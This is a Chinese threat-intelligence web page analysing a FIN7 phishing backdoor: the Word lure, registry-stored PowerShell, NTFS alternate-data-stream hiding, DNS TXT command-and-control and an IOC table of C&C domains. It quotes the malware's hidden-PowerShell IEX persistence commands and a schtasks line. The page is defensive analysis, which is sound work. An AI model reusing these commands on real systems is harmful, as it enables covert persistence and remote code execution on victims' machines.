<!DOCTYPE html><html data-n-head="" data-n-head-ssr><meta data-n-head="true" charset="utf-8"><meta data-n-head="true" content="width=device-width,initial-scale=1" name="viewport"><meta data-n-head="true" content="Nuxt.js project" name="description" data-hid="description"><title data-n-head="true">360威胁情报中心</title><link href="/fav.ico" rel="icon" data-n-head="true" type="image/x-icon"><link href="/_nuxt/manifest.863edfce59f0a00ce608.js" rel="preload" as="script"><link href="/_nuxt/vendor.bundle.21224f443c6ee9ce918d.js" rel="preload" as="script"><link href="/_nuxt/nuxt.bundle.b8b247420f15d35e36d4.js" rel="preload" as="script"><link href="/_nuxt/0.nuxt.bundle.2df9fec90221d3916af4.js" rel="prefetch"><link href="/_nuxt/1.nuxt.bundle.a78c0d1fcdf1a526e7b5.js" rel="prefetch"><link href="/_nuxt/2.nuxt.bundle.f39815f9942bae29e5fd.js" rel="prefetch"><link href="/_nuxt/3.nuxt.bundle.7f40b4df92fe73eb8bcb.js" rel="prefetch"><style data-vue-ssr-id="1cbf7f39:0 198c0e1e:0 034fd8e0:0 ba3a09e0:0 c2ba7178:0 01cb4693:0 69b5e360:0">.progress[data-v-862bdd9c]{position:fixed;top:0;left:0;right:0;height:2px;width:0;-webkit-transition:width .2s,opacity .4s;-o-transition:width .2s,opacity .4s;transition:width .2s,opacity .4s;opacity:1;background-color:#efc14e;z-index:999999}.hljs ::-webkit-scrollbar{width:8px;height:10px;border-radius:2px;background-color:#839496}.hljs ::-webkit-scrollbar-track{background-color:#bebebe}.hljs ::-webkit-scrollbar-thumb,.hljs ::-webkit-scrollbar-track{border-radius:2px;-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3)}.hljs ::-webkit-scrollbar-thumb{background-color:#789}html{font-family:Source Sans Pro,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;font-size:16px;word-spacing:1px;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;-webkit-box-sizing:border-box;box-sizing:border-box}body{background-color:rgba(66,66,66,.05)}*,:after,:before{-webkit-box-sizing:border-box;box-sizing:border-box;margin:0;text-decoration:none}a:active,a:hover,a:link,a:visited{color:#0b1802}.main-body h1,.main-body h2,.main-body h3,.main-body h4,.main-body h5,.main-body h6{margin-top:0;margin-bottom:.5rem}.main-body p{margin-top:0;margin-bottom:1rem;font-size:15px;text-indent:25px;word-wrap:break-word}.main-body img{vertical-align:middle;border-style:none;margin:auto 20px auto auto;padding:3px;border-radius:3px;background-color:#e6e6d5;-webkit-box-shadow:0 1px 2px rgba(0,0,0,.15);box-shadow:0 1px 2px rgba(0,0,0,.15);border:1px solid #b9baa6}.main-body .text-center{text-align:center!important}.main-body table{border-collapse:collapse!important;width:100%;max-width:100%;margin:1em 0;background-color:transparent}.main-body table tbody+tbody{border-top:2px solid #e9ecef}.main-body table td,.main-body table th{padding:.5rem;font-size:.95em;text-align:center;border-collapse:collapse}.main-body table tr{border:1px solid #dfe8fe}.main-body table tr:nth-child(odd){background-color:#ecf1fe}.main-body table tr:nth-child(2n){background-color:#fdfdfd}.main-body table td{white-space:normal;word-break:break-all}.main-body code,.main-body kbd,.main-body pre,.main-body samp{font-family:Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace}.nav-bar[data-v-42857612]{height:60px;border-bottom:1px solid #d5d5d5}.nav-bar .ico-favicon[data-v-42857612]{height:28px;margin-top:16px;margin-left:108px;cursor:pointer}.nav-bar .ico-home[data-v-42857612]{display:inline-block;margin:16px;float:right}.disPic .pic[data-v-42857612]{background-color:#faa732;height:480px;width:100%}.article-page[data-v-8db87e62]{margin:0 auto;max-width:1108px;background-size:cover}.article-page .page-header[data-v-8db87e62]{border-bottom:1px solid #efefef}.article-page .page-header .ava img[data-v-8db87e62]{border-radius:50%;height:56px;width:56px;float:left;margin:12px}.article-page .page-header .title[data-v-8db87e62]{font-size:48px;color:#0b1802;font-family:"Verdana, \5FAE\8F6F\96C5\9ED1, \5B8B\4F53, Geneva, 'sans-serif'"}.article-page .page-header .author[data-v-8db87e62]{display:inline-block;color:#979996;font-size:16px;font-family:"Verdana, \5FAE\8F6F\96C5\9ED1, \5B8B\4F53, Geneva, 'sans-serif'";margin:12px 7px 12px 0;line-height:16px}.article-page .page-header .author .ico-time img[data-v-8db87e62]{width:16px;height:16px}.article-page .main-body[data-v-8db87e62]{padding:0 108px;margin:28px auto 168px;background:url(/_nuxt/img/post-entry-bg.98216ca.png) no-repeat -10px 9px}.title-home[data-v-552f8598]{font-family:sans-serif;line-height:32px;font-size:24px;color:#0b1802;cursor:pointer}.title-home[data-v-552f8598]:hover{text-shadow:2px 3px 1px #d0d0d0}.title-detail[data-v-552f8598]{font-size:48px;color:#0b1802;font-family:Arial Rounded MT Bold;margin-top:48px;line-height:64px}@media screen and (min-width:550px) and (max-width:950px){.title-home div[data-v-552f8598]{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap}}@media screen and (max-width:550px){.title-home div[data-v-552f8598]{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap}}.tags[data-v-53a17526]{height:42px;padding-top:10px}.tag[data-v-53a17526]{background-color:#6aacd8;display:inline-block;height:22px;font-size:13px;color:#fefefe;font-family:sans-serif;padding:2px 6px;margin-right:8px;border-radius:2px}</style><body data-n-head=""><div data-server-rendered="true" id="__nuxt"><div class="progress" data-v-862bdd9c style="width:0%;height:2px;background-color:#3b8070;opacity:0"></div><div><section><div data-v-42857612><div class="nav-bar" data-v-42857612><a href="/" data-v-42857612><img src="/_nuxt/img/blog-icon.f80549d.png" class="ico-favicon" data-v-42857612></a><a href="/" data-v-42857612><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABYklEQVRYR+2Vy1HDMBCGV5sG0oLH3EkHkA78CHUAHdABtMCZyHEHdgnmHo8pIQ1kxcgTh+DRY20fAjPWTaOV/s//PizgyktcWR9mgP/rQLRrlkj0qGuIEN/zOPgaU0+jHIh2zQqJCgGw1KIK4ECI6zwOqqEQgwH64p3gWIhBADbxKRBsgFPOm852m9VDnWABaPHFkQoQsOLk+AQR5HFw8MV7AYaKnwUVVMdFW5hOCCfAaPGfovBCWAEmizMhrACJrCsBcOvLIevckQ4jQCLrJwHwynqcGaQAnrM0fOuH/00ATbn5aO7bMYtUMD/SGCYI1/pg+xCUpgBvG6ayVqaLCuATQJ1bTIC4M8XJNHRqjAboP2wDnQFmByY7kMh9aapwThHqTsnS0PkH9XfBdh+BELt+i3EAQKlYbm5y1xzxAnRDiZDawdStLA1fLveJrH/tkbC0DZ/LeyyAKZPQd3cGmB34BjX7xSHXvTXWAAAAAElFTkSuQmCC" class="ico-home" data-v-42857612></a></div><!----></div><div class="article-page" data-v-8db87e62><div class="page-header" data-v-8db87e62><div class="title-detail" data-v-8db87e62 data-v-552f8598>FIN7 APT组织攻击木马分析报告</div><div class="ava" data-v-8db87e62><img src="/_nuxt/img/Avatar.e419573.jpg" data-v-8db87e62></div><div class="tags" data-v-8db87e62 data-v-53a17526><p class="tag" data-v-53a17526>FIN7<p class="tag" data-v-53a17526>APT<p class="tag" data-v-53a17526>BACKDOOR</div><div class="author lh32" data-v-8db87e62>admin on</div></div><div class="main-body" data-v-8db87e62><h2 class="line" data-line="0">事件背景</h2><p class="line" data-line="2">2017年3月，FireEye发布了一篇名黑客组织FIN7的APT攻击简报，报告称FIN7组织以钓鱼邮件为攻击渠道，主要对美国金融机构渗透攻击。组织的攻击利用DNS协议的TXT字段进行C&C通信。360威胁情报中心对此APT组织的攻击链条进行了梳理，对木马相关的技术进行了分析，揭示其一些有意思的技巧。<h2 class="line" data-line="4">目标样本</h2><table><thead><tr><th><th><tbody><tr><td><strong>Hash</strong><td>d04b6410dddee19adec75f597c52e386<tr><td><strong>文件类型</strong><td>Word文档<tr><td><strong>文件大小</strong><td>1,834,496字节</table><h2 class="line" data-line="12">攻击特点与攻击流程</h2><p class="line" data-line="14">FIN7攻击特点主要体现在：<ol><li>全部攻击过程使用非PE实现，钓鱼使用doc文件，后门使用powershell文件。<li>使用ADS数据隐藏保存在磁盘中的非PE文件<li>后门文件保存在注册表中，功能由Powershell实现<li>与C&C通信使用DNS协议的TXT记录<li>C&C地址从64个硬编码的地址中随机选择</ol><p class="line" data-line="22">攻击流程：<p class="line" data-line="24">在整个攻击过程中，没有使用到PE文件，这在一定程度上躲避了安全软件的查杀。落地的文件也进行了技术上的隐藏，而真正的后门程序却已加密的方式存储在注册表中。<p class="line" data-line="26">攻击者以钓鱼邮件为进入渠道，在恶意文档中嵌入vbs脚本，vbs脚本运行后解密后门程序写入注册表中，同时将调用后门程序的脚本以ads隐藏在磁盘文件中。在后门运行后，使用DNS TXT做为C&C通信方式。<p class="line text-center" data-line="28"><img src="/uploads/2017/07/25/82355e36b499e5621c500a61ecb5b32e.png" alt="" width="90%"><h2 class="line" data-line="30">样本分析</h2><p class="line" data-line="32">钓鱼邮件打开后，显示如下图所示，可以看到，文档中插入了一张图片，图片字体显示模糊。<p class="line text-center" data-line="34"><img src="/uploads/2017/07/25/3dc3540f45b7f96562007d8f96e3c72a.png" alt="" height="300"><p class="line" data-line="36">通过分析，得到了钓鱼文档的制作过程：分别插入了一个vbs的OLE对象与一张字迹模糊的图片，将OLE对象的图标设置为透明图标并置入图片对象的顶层，最将两个对象组合到一起，这样就达到了双击图片，实际上运行了vbs脚本的目的。<p class="line" data-line="38">双击图片，就会打开vbs脚本，只有当用户点击弹出的对话框中的确定后，才会运行vbs脚本，如果在这时，用户点击了取消，就可以阻断这次攻击。<p class="line text-center" data-line="40"><img src="/uploads/2017/07/25/ca530c4b9b5a6a179063bdbf5827c334.png" alt=""><p class="line" data-line="42">为了诱导用户双击图片运行vbs脚本，文档中还写入“This document is protected by Microsoft Office and requires human verification Please Enable Editing and Double Click on page below.”（文档被Microsoft Office 保护，请启用编辑并双击下面的图片）。<h3 class="line" data-line="44">VBS功能：</h3><p class="line" data-line="46">当上面的图片被双击运行后，程序后台会运行VBS脚本，该脚本功能为：调用powershell解密一大段字符，从代码中可以看出，解密出来的为一gz文件，因此可以将这大段base64解密后，保存成gz格式，使用解压工具得到压缩文件继续分析。<p class="line text-center" data-line="48"><img src="/uploads/2017/07/25/efe5911f07c641ea18e8dcd8bc7aa2d8.png" alt="" width="90%"><h3 class="line" data-line="50">样本加载感染过程：</h3><p class="line" data-line="52">gz中的文件也是一个powershell脚本。脚本经过混淆，实现的功能是：判断当前用户是不是administartor权限，根据不同的权限写入不同的注册表内容，这些内容为开机后会解密执行的代码，随后通过ADS将加载注册表内容的vbs脚本写入C:\ProgramData\windows:CtxDnsClient.vbs文件中，并将该文件加入启动项和计划任务中。<p class="line" data-line="56">原始的powershell内容，可以看到powershell脚本经过了混淆：<p class="line text-center" data-line="58"><img src="/uploads/2017/07/25/1bf4746c480aee7d805b5ab2e16e9260.png" alt="" width="90%"><h4 class="line" data-line="60">后门程序写入注册表</h4><p class="line" data-line="62">Powershell写入到注册表中的后门程序的内容如下：<p class="line text-center" data-line="64"><img src="/uploads/2017/07/25/4ee8cfbe553b6af66bb4785af970ce5c.png" alt="" width="90%"><h4 class="line" data-line="66">ADS隐藏磁盘文件</h4><p class="line" data-line="68">将要实现开机启动的文件写入到磁盘文件C:\ProgramData\Windows:CtxDnsClient.vbs中。<p class="line" data-line="70">对于Windows:CtxDnsClient.vbs文件，使用了ADS数据隐藏技术。而通过ADS隐藏的数据在Windows系统中无法显示，文件大小也显示为0字节：<p class="line text-center" data-line="72"><img src="/uploads/2017/07/25/5795bab47fcf1f01756b0f687073b372.png" alt=""><p class="line" data-line="74">但是使用dir /r命令，可以看到ADS中有隐藏的数据<p class="line text-center" data-line="76"><img src="/uploads/2017/07/25/1b8f9439a9b5527869a722d745ddea26.png" alt=""><p class="line" data-line="78">启动项中的隐藏的ads数据，dump出来后显示如下：<p class="line text-center" data-line="80"><img src="/uploads/2017/07/25/e725019097179e8f215bbdee701809d7.png" alt="" width="90%"><p class="line" data-line="82">使用 ADS中隐藏数据内容为：<pre class="hljs"><code class="hljs">cmd /c "echo Set objShell = CreateObject(""Wscript.shell"") > C:\\ProgramData\\Windows:CtxDnsClient.vbs"

cmd /c "echo objShell.run ""powershell -WindowStyle Hidden -executionpolicy bypass -C IEX ((Get-ItemProperty -Path HKCU:Software\\Microsoft\\Windows).Part)"",0 >> C:\\ProgramData\\Windows:CtxDnsClient.vbs"
</code></pre><h4 class="line" data-line="90">添加开机启动</h4><p class="line" data-line="92">创建的启动项，启动项位置为HKCU\Software\Microsoft\Windows\CurrentVersion\Run\：<p class="line text-center" data-line="94"><img src="/uploads/2017/07/25/56307f5b0fc04f4adff1ed5ebf3bdef1.png" alt="" width="90%"><p class="line" data-line="96">添加计划任务：<pre class="hljs"><code class="hljs">schtasks.exe /F /create /tn CtxDnsClient /tr "C:\\Windows\\System32\\wscript.exe C:\\ProgramData\\Windows:CtxDnsClient.vbs " /sc onidle /i 30
</code></pre><p class="line" data-line="102">通过上面这些过程，来实现程序的自启动。在系统重新启动后，启动项中的wscript.exe会加载Windows:CtxDnsClient.vbs，Windows:CtxDnsClient.vbs中会使用powershell加载HKCU\Software\Microsoft\Windows\Part内容，part中实现的功能会加载注册表相同位置下的CtxDnsClient的内容。这里的内容就是真正的实现CC的功能。<h3 class="line" data-line="104">C&C通信功能</h3><p class="line" data-line="106">这部分功能主要在注册表中的HKCU\Software\Microsoft\Windows下CtxDnsClient的内容中，主要功能为：从内置的64个域名中随机选择一个，查询该域名的SPF记录，用来实现自己的C&C通信。<p class="line" data-line="108">创建名为”SourceFireSux”的互斥体，防止程序重复运行：<p class="line text-center" data-line="110"><img src="/uploads/2017/07/25/4431ee531ea5f531a4073e81e41f98eb.png" alt="" width="90%"><p class="line" data-line="113">编码过的64个域名地址代码片段：<p class="line text-center" data-line="115"><img src="/uploads/2017/07/25/381eb523dccae6134a1175490710d43b.png" alt="" width="90%"><p class="line text-center" data-line="118"><img src="/uploads/2017/07/25/a74320966532d81dae8a9ab122eed550.png" alt="" width="90%"><p class="line" data-line="121">从这64个域名中，随机选取一个（如这里随机被选择到的为：pbbk.us），加上www前缀，查询对应DNS TXT记录内容（即查询www.pbbk.us的dns txt记录）。<p class="line text-center" data-line="123"><img src="/uploads/2017/07/25/dcf44e3c393ad1512846cdd2c268524a.png" alt="" width="90%"><p class="line" data-line="126">如果返回的内容为idle，则程序睡眠3.5秒到5.4秒的随机时间。<p class="line" data-line="128">如果返回的内容为www，则表明这个域名现在正在攻击者控制之中，随后查询mail.pbbk.us的dns txt记录。<p class="line" data-line="130">随后mail.pbbk.us返回的内容就被 powershell直接通过IEX调用执行。<h2 class="line" data-line="132">IOC</h2><p class="line" data-line="134">木马尝试通信的C&C地址：<table><thead><tr><th><strong>域名</strong><th><strong>注册人</strong><th><strong>注册时间</strong><th><strong>备注</strong><tbody><tr><td>www.grij.us<td>Frank Walters<td>2017/2/19 3:09<td><tr><td>www.kwoe.us<td>Frank Walters<td>2017/2/19 3:09<td><tr><td>www.zugh.us<td>Frank Walters<td>2017/2/19 3:09<td><tr><td>www.pafk.us<td>Frank Walters<td>2017/2/19 3:09<td><tr><td>www.cuuo.us<td>Frank Walters<td>2017/2/19 3:07<td><tr><td>www.ooyh.us<td>Frank Walters<td>2017/2/19 3:07<td><tr><td>www.vxqt.us<td>Frank Walters<td>2017/2/19 3:06<td><tr><td>www.cgqy.us<td>Frank Walters<td>2017/2/19 3:07<td><tr><td>www.wfsv.us<td>Frank Walters<td>2017/2/19 3:07<td><tr><td>www.palj.us<td>Frank Walters<td>2017/2/19 3:09<td><tr><td>www.idjb.us<td>Frank Walters<td>2017/2/19 3:09<td><tr><td>www.zjav.us<td>Frank Walters<td>2017/2/19 3:09<td><tr><td>www.mewt.us<td>Frank Walters<td>2017/2/19 3:06<td><tr><td>www.vkpo.us<td>Frank Walters<td>2017/2/19 3:07<td><tr><td>www.wqiy.info<td>WhoisGuard Protected<td>2017/2/18 19:08<td><tr><td>www.wvzu.pw<td>WhoisGuard Protected<td>2017/2/18 0:00<td><tr><td>www.gxhp.top<td>WhoisGuard Protected<td>2017/2/18 19:07<td><tr><td>www.hvzr.info<td>WhoisGuard Protected<td>2017/2/18 19:07<td><tr><td>www.reld.info<td>WhoisGuard Protected<td>2017/2/18 0:00<td><tr><td>www.vqba.info<td>WhoisGuard Protected<td>2017/2/18 19:06<td><tr><td>www.oxrp.info<td>WhoisGuard Protected<td>2017/2/18 19:08<td><tr><td>www.dvso.pw<td>WhoisGuard Protected<td>2017/2/18 0:00<td><tr><td>www.bvyv.club<td><td><td><tr><td>www.bwuk.club<td><td><td><tr><td>www.cihr.site<td><td><td><tr><td>www.coec.club<td><td><td><tr><td>www.oyaw.club<td><td><td><tr><td>www.pbbk.us<td><td><td><tr><td>www.ppdx.pw<td><td><td><tr><td>www.pvze.club<td><td><td><tr><td>www.qefg.info<td><td><td><tr><td>www.qlpa.club<td><td><td><tr><td>www.ueox.club<td><td><td><tr><td>www.ufyb.club<td><td><td><tr><td>www.dbxa.pw<td><td><td><tr><td>www.eady.club<td><td><td><tr><td>www.enuv.club<td><td><td><tr><td>www.eter.pw<td><td><td><tr><td>www.utca.site<td><td><td><tr><td>www.vdfe.site<td><td><td><tr><td>www.vjro.club<td><td><td><tr><td>www.fbjz.pw<td><td><td><tr><td>www.fhyi.club<td><td><td><tr><td>www.futh.pw<td><td><td><tr><td>www.gnoa.pw<td><td><td><tr><td>www.vwcq.us<td><td><td><tr><td>www.jimw.club<td><td><td><tr><td>www.jomp.site<td><td><td><tr><td>www.jxhv.site<td><td><td><tr><td>www.kshv.site<td><td><td><tr><td>www.ysxy.pw<td><td><td><tr><td>www.zmyo.club<td><td><td><tr><td>www.zody.pw<td><td><td><tr><td>www.lhlv.club<td><td><td><tr><td>www.lnoy.site<td><td><td><tr><td>www.lvrm.pw<td><td><td><tr><td>www.mfka.pw<td><td><td><tr><td>www.nxpu.site<td><td><td><tr><td>www.oaax.site<td><td><td><tr><td>www.odyr.us<td><td><td><tr><td>www.oknz.club<td><td><td><tr><td>www.ooep.pw<td><td><td><tr><td>www.ckwl.pw<td>Lin Shi Mo Ban<td>2015/11/11 0:00<td>不能作为IOC<tr><td>www.zcnt.pw<td>Lin Shi Mo Ban<td>2015/11/16 0:00<td>不能作为IOC</table><h2 class="line" data-line="203">参考链接</h2><p class="line" data-line="205"><a href="https://www.fireeye.com/blog/threat-research/2017/03/fin7_spear_phishing.html">fireeye-fin7 spear phishing</a></div></div></section></div></div><script type="text/javascript">window.__NUXT__={layout:"default",data:[{articleData:{_id:"597733a71c670a09e493ee3a",title:"FIN7 APT组织攻击木马分析报告",author:"admin",content:'<h2 class="line" data-line="0">事件背景</h2>\n<p class="line" data-line="2">2017年3月，FireEye发布了一篇名黑客组织FIN7的APT攻击简报，报告称FIN7组织以钓鱼邮件为攻击渠道，主要对美国金融机构渗透攻击。组织的攻击利用DNS协议的TXT字段进行C&amp;C通信。360威胁情报中心对此APT组织的攻击链条进行了梳理，对木马相关的技术进行了分析，揭示其一些有意思的技巧。</p>\n<h2 class="line" data-line="4">目标样本</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>d04b6410dddee19adec75f597c52e386</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>Word文档</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>1,834,496字节</td>\n</tr>\n</tbody>\n</table>\n<h2 class="line" data-line="12">攻击特点与攻击流程</h2>\n<p class="line" data-line="14">FIN7攻击特点主要体现在：</p>\n<ol>\n<li>全部攻击过程使用非PE实现，钓鱼使用doc文件，后门使用powershell文件。</li>\n<li>使用ADS数据隐藏保存在磁盘中的非PE文件</li>\n<li>后门文件保存在注册表中，功能由Powershell实现</li>\n<li>与C&amp;C通信使用DNS协议的TXT记录</li>\n<li>C&amp;C地址从64个硬编码的地址中随机选择</li>\n</ol>\n<p class="line" data-line="22">攻击流程：</p>\n<p class="line" data-line="24">在整个攻击过程中，没有使用到PE文件，这在一定程度上躲避了安全软件的查杀。落地的文件也进行了技术上的隐藏，而真正的后门程序却已加密的方式存储在注册表中。</p>\n<p class="line" data-line="26">攻击者以钓鱼邮件为进入渠道，在恶意文档中嵌入vbs脚本，vbs脚本运行后解密后门程序写入注册表中，同时将调用后门程序的脚本以ads隐藏在磁盘文件中。在后门运行后，使用DNS TXT做为C&amp;C通信方式。</p>\n<p class="text-center line" data-line="28"><img src="/uploads/2017/07/25/82355e36b499e5621c500a61ecb5b32e.png" alt="" width="90%"></p>\n<h2 class="line" data-line="30">样本分析</h2>\n<p class="line" data-line="32">钓鱼邮件打开后，显示如下图所示，可以看到，文档中插入了一张图片，图片字体显示模糊。</p>\n<p class="text-center line" data-line="34"><img src="/uploads/2017/07/25/3dc3540f45b7f96562007d8f96e3c72a.png" alt="" height="300"></p>\n<p class="line" data-line="36">通过分析，得到了钓鱼文档的制作过程：分别插入了一个vbs的OLE对象与一张字迹模糊的图片，将OLE对象的图标设置为透明图标并置入图片对象的顶层，最将两个对象组合到一起，这样就达到了双击图片，实际上运行了vbs脚本的目的。</p>\n<p class="line" data-line="38">双击图片，就会打开vbs脚本，只有当用户点击弹出的对话框中的确定后，才会运行vbs脚本，如果在这时，用户点击了取消，就可以阻断这次攻击。</p>\n<p class="text-center line" data-line="40"><img src="/uploads/2017/07/25/ca530c4b9b5a6a179063bdbf5827c334.png" alt=""></p>\n<p class="line" data-line="42">为了诱导用户双击图片运行vbs脚本，文档中还写入“This document is protected by Microsoft Office and requires human verification Please Enable Editing and Double Click on page below.”（文档被Microsoft Office 保护，请启用编辑并双击下面的图片）。</p>\n<h3 class="line" data-line="44">VBS功能：</h3>\n<p class="line" data-line="46">当上面的图片被双击运行后，程序后台会运行VBS脚本，该脚本功能为：调用powershell解密一大段字符，从代码中可以看出，解密出来的为一gz文件，因此可以将这大段base64解密后，保存成gz格式，使用解压工具得到压缩文件继续分析。</p>\n<p class="text-center line" data-line="48"><img src="/uploads/2017/07/25/efe5911f07c641ea18e8dcd8bc7aa2d8.png" alt="" width="90%"></p>\n<h3 class="line" data-line="50">样本加载感染过程：</h3>\n<p class="line" data-line="52">gz中的文件也是一个powershell脚本。脚本经过混淆，实现的功能是：判断当前用户是不是administartor权限，根据不同的权限写入不同的注册表内容，这些内容为开机后会解密执行的代码，随后通过ADS将加载注册表内容的vbs脚本写入C:\\ProgramData\\windows:CtxDnsClient.vbs文件中，并将该文件加入启动项和计划任务中。</p>\n<p class="line" data-line="56">原始的powershell内容，可以看到powershell脚本经过了混淆：</p>\n<p class="text-center line" data-line="58"><img src="/uploads/2017/07/25/1bf4746c480aee7d805b5ab2e16e9260.png" alt="" width="90%"></p>\n<h4 class="line" data-line="60">后门程序写入注册表</h4>\n<p class="line" data-line="62">Powershell写入到注册表中的后门程序的内容如下：</p>\n<p class="text-center line" data-line="64"><img src="/uploads/2017/07/25/4ee8cfbe553b6af66bb4785af970ce5c.png" alt="" width="90%"></p>\n<h4 class="line" data-line="66">ADS隐藏磁盘文件</h4>\n<p class="line" data-line="68">将要实现开机启动的文件写入到磁盘文件C:\\ProgramData\\Windows:CtxDnsClient.vbs中。</p>\n<p class="line" data-line="70">对于Windows:CtxDnsClient.vbs文件，使用了ADS数据隐藏技术。而通过ADS隐藏的数据在Windows系统中无法显示，文件大小也显示为0字节：</p>\n<p class="text-center line" data-line="72"><img src="/uploads/2017/07/25/5795bab47fcf1f01756b0f687073b372.png" alt=""></p>\n<p class="line" data-line="74">但是使用dir /r命令，可以看到ADS中有隐藏的数据</p>\n<p class="text-center line" data-line="76"><img src="/uploads/2017/07/25/1b8f9439a9b5527869a722d745ddea26.png" alt=""></p>\n<p class="line" data-line="78">启动项中的隐藏的ads数据，dump出来后显示如下：</p>\n<p class="text-center line" data-line="80"><img src="/uploads/2017/07/25/e725019097179e8f215bbdee701809d7.png" alt="" width="90%"></p>\n<p class="line" data-line="82">使用 ADS中隐藏数据内容为：</p>\n<pre class="hljs"><code class="hljs">cmd /c "echo Set objShell = CreateObject(""Wscript.shell"") > C:\\\\ProgramData\\\\Windows:CtxDnsClient.vbs"\n\ncmd /c "echo objShell.run ""powershell -WindowStyle Hidden -executionpolicy bypass -C IEX ((Get-ItemProperty -Path HKCU:Software\\\\Microsoft\\\\Windows).Part)"",0 >> C:\\\\ProgramData\\\\Windows:CtxDnsClient.vbs"\n</code></pre>\n<h4 class="line" data-line="90">添加开机启动</h4>\n<p class="line" data-line="92">创建的启动项，启动项位置为HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\：</p>\n<p class="text-center line" data-line="94"><img src="/uploads/2017/07/25/56307f5b0fc04f4adff1ed5ebf3bdef1.png" alt="" width="90%"></p>\n<p class="line" data-line="96">添加计划任务：</p>\n<pre class="hljs"><code class="hljs">schtasks.exe /F /create /tn CtxDnsClient /tr "C:\\\\Windows\\\\System32\\\\wscript.exe C:\\\\ProgramData\\\\Windows:CtxDnsClient.vbs " /sc onidle /i 30\n</code></pre>\n<p class="line" data-line="102">通过上面这些过程，来实现程序的自启动。在系统重新启动后，启动项中的wscript.exe会加载Windows:CtxDnsClient.vbs，Windows:CtxDnsClient.vbs中会使用powershell加载HKCU\\Software\\Microsoft\\Windows\\Part内容，part中实现的功能会加载注册表相同位置下的CtxDnsClient的内容。这里的内容就是真正的实现CC的功能。</p>\n<h3 class="line" data-line="104">C&amp;C通信功能</h3>\n<p class="line" data-line="106">这部分功能主要在注册表中的HKCU\\Software\\Microsoft\\Windows下CtxDnsClient的内容中，主要功能为：从内置的64个域名中随机选择一个，查询该域名的SPF记录，用来实现自己的C&amp;C通信。</p>\n<p class="line" data-line="108">创建名为”SourceFireSux”的互斥体，防止程序重复运行：</p>\n<p class="text-center line" data-line="110"><img src="/uploads/2017/07/25/4431ee531ea5f531a4073e81e41f98eb.png" alt="" width="90%"></p>\n<p class="line" data-line="113">编码过的64个域名地址代码片段：</p>\n<p class="text-center line" data-line="115"><img src="/uploads/2017/07/25/381eb523dccae6134a1175490710d43b.png" alt="" width="90%"></p>\n<p class="text-center line" data-line="118"><img src="/uploads/2017/07/25/a74320966532d81dae8a9ab122eed550.png" alt="" width="90%"></p>\n<p class="line" data-line="121">从这64个域名中，随机选取一个（如这里随机被选择到的为：pbbk.us），加上www前缀，查询对应DNS TXT记录内容（即查询www.pbbk.us的dns txt记录）。</p>\n<p class="text-center line" data-line="123"><img src="/uploads/2017/07/25/dcf44e3c393ad1512846cdd2c268524a.png" alt="" width="90%"></p>\n<p class="line" data-line="126">如果返回的内容为idle，则程序睡眠3.5秒到5.4秒的随机时间。</p>\n<p class="line" data-line="128">如果返回的内容为www，则表明这个域名现在正在攻击者控制之中，随后查询mail.pbbk.us的dns txt记录。</p>\n<p class="line" data-line="130">随后mail.pbbk.us返回的内容就被 powershell直接通过IEX调用执行。</p>\n<h2 class="line" data-line="132">IOC</h2>\n<p class="line" data-line="134">木马尝试通信的C&amp;C地址：</p>\n<table>\n<thead>\n<tr>\n<th><strong>域名</strong></th>\n<th><strong>注册人</strong></th>\n<th><strong>注册时间</strong></th>\n<th><strong>备注</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>www.grij.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.kwoe.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.zugh.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.pafk.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.cuuo.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.ooyh.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.vxqt.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:06</td>\n<td></td>\n</tr>\n<tr>\n<td>www.cgqy.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.wfsv.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.palj.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.idjb.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.zjav.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:09</td>\n<td></td>\n</tr>\n<tr>\n<td>www.mewt.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:06</td>\n<td></td>\n</tr>\n<tr>\n<td>www.vkpo.us</td>\n<td>Frank Walters</td>\n<td>2017/2/19 3:07</td>\n<td></td>\n</tr>\n<tr>\n<td>www.wqiy.info</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 19:08</td>\n<td></td>\n</tr>\n<tr>\n<td>www.wvzu.pw</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 0:00</td>\n<td></td>\n</tr>\n<tr>\n<td>www.gxhp.top</td>\n<td>WhoisGuard Protected</td>\n<td>2017/2/18 